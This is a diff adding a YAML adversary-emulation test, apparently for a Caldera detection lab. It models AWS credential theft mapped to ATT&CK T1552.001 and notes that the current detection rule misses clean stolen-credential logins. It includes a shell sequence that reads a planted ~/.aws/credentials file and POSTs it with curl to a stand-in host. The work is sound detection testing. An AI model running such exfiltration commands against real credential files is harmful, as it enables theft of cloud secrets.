@@ -1,0 +1,39 @@
+- id: linux_creds_aws_read
+  name: Clean cred-theft + AWS creds read + login from new IP
+  description: |
+    Models the canonical cloud cred-theft chain: read realuser's
+    ~/.aws/credentials, exfil via curl, then perform a clean SSH login
+    from a brand-new source IP — no preceding brute-force failures.
+    Phase 21 expects no detection (Gap 3, A5 evidence): the existing
+    auth_anomalous_source_success.py gates on failure_count >= 1, so a
+    clean stolen-creds login never trips it. Phase 22 candidate:
+    auth_baseline_unknown_source_success keyed on a per-user 90-day
+    source-IP baseline.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: Credentials In Files
+  platforms:
+    linux:
+      sh:
+        command: |
+          # Stage 1: write a fake AWS credentials file (lab-debian doesn't
+          # ship one by default — this is the same shape Phase 20's A5
+          # scenario uses).
+          mkdir -p /home/realuser/.aws
+          cat > /home/realuser/.aws/credentials <<'CREDS'
+          [default]
+          aws_access_key_id = AKIAEXAMPLEPHASE21
+          aws_secret_access_key = phase21SecretAccessKeyPlaceholderXXXXXXX
+          CREDS
+          chown -R realuser:realuser /home/realuser/.aws
+          # Stage 2: read it (the file event we want to surface).
+          cat /home/realuser/.aws/credentials > /tmp/.aws-stolen
+          # Stage 3: exfil via curl. Fails fast — that's fine.
+          curl -s --max-time 3 -X POST -d @/tmp/.aws-stolen http://198.51.100.77/exfil || true
+          # Stage 4: clean ssh login from realuser's session, no preceding
+          # failures. Caldera's own ssh ability will be the auth surface
+          # in the operation; this stage is just the cred-theft prelude.
+        cleanup: |
+          rm -f /tmp/.aws-stolen
+          rm -rf /home/realuser/.aws
